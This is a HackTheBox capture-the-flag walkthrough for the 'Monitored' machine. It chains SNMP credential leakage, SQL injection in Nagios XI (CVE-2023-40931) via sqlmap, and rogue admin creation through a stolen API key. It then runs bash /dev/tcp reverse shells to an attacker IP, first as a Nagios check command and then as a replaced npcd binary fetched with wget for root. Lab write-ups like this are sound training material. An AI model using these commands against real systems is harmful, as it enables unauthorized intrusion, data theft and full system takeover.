## Description

This is a detailed walkthrough of "Monitored" machine on HackTheBox platform that is based on Linux operating system and categorized as "Medium"
by difficulty. The machine has Nagios XI software running on it and involves utilizing a vulnerability chain (including SQL Injection) to establish a foothold on the system. Privilege escalation requires abusing sudo permissions on system scripts.

## Reconnaissance

The reconnaissance part is **extremely** important on this machine and unforgiving to mistakes.
The default **nmap** scan reveals the following services:

  <figcaption></figcaption>
</figure>

The services of our interest here are http, https and ldap. Attempting to dump credentials from LDAP using anonymous login leads to no result:

```bash
nmap -n -sV --script "ldap*" <IP> -p 389
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/ldapdump.png" alt="">
  <figcaption></figcaption>
</figure>

Here comes the important part, missing which can cause the challenger to enter a rabbit hole. It's necessary to run a UDP scan as there's **SNMP** service running on port 161 UDP. From that service, it's possible to dump SNMP process list. One of the processes will contain **credentials** required to authenticate in Nagios.

The following nmap scan reveals the credentials:

```bash
nmap -sU -sC -sV -T4 <IP> #-sU - UDP Scan; -sC - run default scripts, -sV - enumerate service version, -T4 - scan speed
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/snmpcreds.png" alt="">
  <figcaption></figcaption>
</figure>

Navigate to *https://monitored.htb*. You will be presented with the following login page:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/nagiosinitialpage.png" alt="">
  <figcaption></figcaption>
</figure>

It is not possible to login with the discovered credentials there, however, they can be used at Nagios system dashboard located at *https://monitored.htb/nagios/*. Navigate there and enter the credentials in the pop-up window. Successful authentication should present the following page:

### CVE-2023-40931

We have achieved authenticated access to Nagios. The time has come for an exhausting vulnerability research. Eventually, it will lead the challenger to this [article](https://outpost24.com/blog/nagios-xi-vulnerabilities/) on Outpost24. It reveals information about CVE-2023-40931 - "SQL Injection in Banner acknowledging endpoint". When a user acknowledges a banner, a POST request is sent to */nagiosxi/admin/banner_message-ajaxhelper.php* with the POST data consisting of the intended action and message ID â€“ *action=acknowledge banner message&id=3*.

The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the *xi_session* and *xi_users* table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets. This vulnerability does not require the existence of a valid announcement banner ID, meaning it can be exploited by an attacker at any time.

## Weaponization / Exploitation

Firstly, it is necessary to request authentication token for our current user. According to this [thread](https://support.nagios.com/forum/viewtopic.php?p=310411#p310411) on Nagios support forum, it can be done by issuing the following command:

```bash
curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=<USERNAME>&password=<PASSWORD>&valid_min=500'
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/authtoken.png" alt="">
  <figcaption></figcaption>
</figure>

Now that the tokes has been received, let's attempt to dump *xi_users* table with **sqlmap**:

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=<YOUR TOKEN>" --level 5 --risk 3 -p id --batch -D nagiosxi -T xi_users --dump
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/adminapi.png" alt="">
  <figcaption>sqlmap dump reveals admin API token</figcaption>
</figure>

*xi_users* table cotains Nagios Administrator account API token that can be used to query Nagios API to create a new user with administrative privileges as described on the following [page](https://support.nagios.com/forum/viewtopic.php?p=310411#p310411) on Nagios support forum. The command do to so is the following:

```bash
curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=<ADMIN API KEY>&pretty=1" -d "username=<DESIRED USERNAME>&password=<DESIRED PASSWORD>&name=adminlol&email=adminlol@localhost&auth_level=admin"
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/createnewadmin.png" alt="">
  <figcaption></figcaption>
</figure>

Navigate to *https://nagios.monitored.htb/nagiosxi/* and login with your newly created account. After accepting license agreement and password change form, the challenger is presented with Nagios administrative dashboard.

## Foothold

Navigate to Configure => Core Config Manager => Commands => Add New

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/coreconfig.png" alt="">
  <figcaption></figcaption>
</figure>

Create a reverse shell command with the following parameters:
* Command type: check
* Check "Active" box
* Enter the reverse shell command in the "Command view" field and click save.
```bash
bash -c 'bash -i >& /dev/tcp/<YOUR IP>/<YOUR PORT> 0>&1'
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/shellcommand.png" alt="">
  <figcaption></figcaption>
</figure>


Start a Netcat reverse listener:

```bash
nc -lvnp <PORT SPECIFIED IN REVERSE SHELL COMMAND>
```

In Nagios, navigate to Monitoring => Hosts => localhost. In the Host Managment menu, select the created reverse shell command and click "Run Check Command" as shown on the screenshot:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/runshellcommand.png" alt="">
  <figcaption></figcaption>
</figure>

A reverse shell should be sent to Netcat listener, providing you with a foothold into the system.

### User flag

Find nagios user flag in its home directory.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/userflag.png" alt="">
  <figcaption></figcaption>
</figure>

## Privilege escalation

Check what the current user is able to run with administrative privileges:

```bash
sudo -l
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/sudoloutput.png" alt="">
  <figcaption></figcaption>
</figure>

Among the scripts that appear there is **manage_services.sh**. Display its contents:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/scriptcontents.png" alt="">
  <figcaption></figcaption>
</figure>

It is evident that by executing **manage_services.sh** the user is able to control several services that include **npcd** service. Display the contents of **npcd** service to analyze it:

```bash
systemctl cat npcd
```
The service indicates location of its binary file available by the following path */usr/local/nagios/bin/npcd*. Check permissions on the file:
```bash
ls -l /usr/local/nagios/bin/npcd
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/monitored/catnpcdservice.png" alt="">
  <figcaption></figcaption>
</figure>

The current user has write permissions on the **npcd** binary. It is possible to replace contents of the file and execute it with system privileges. On your local machine, create a file called **npcd** with the following contents:

```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP ADDR>/<PORT> 0>&1
```
Open a Netcat listener on the port of your choice. Then, start a Python HTTP server to host your npcd file. On the target system, download it, stop **npcd** service and replace the original **npcd** file located in **/usr/local/nagios/bin/** with the created one:

```bash
# On the Attacker machine:
nc -lnvp <PORT>
python3 -m http.server <PORT> # start HTTP server in the directory where npcd file is located

# On the target machine:
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd # Stop npcd service to be able to replace the binary
wget http://<IP ADDR>:<PORT>/npcd # Download npcd file from HTTP server
mv npcd /usr/local/nagios/bin/  # Move the downloaded file into target directory, replacing the original file
chmod +x /usr/local/nagios/bin/npcd # Assign executable permissions to the file
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd # Start npcd service to receive root shell
```
### Root flag

After transferring **npcd** file containing reverse shell command and replacing the original file with it, start **npcd** service again and, if instructions were completed correctly, the Attacker machine will receive a callback with root privileges. Navigate to */root* directory to get the root flag.
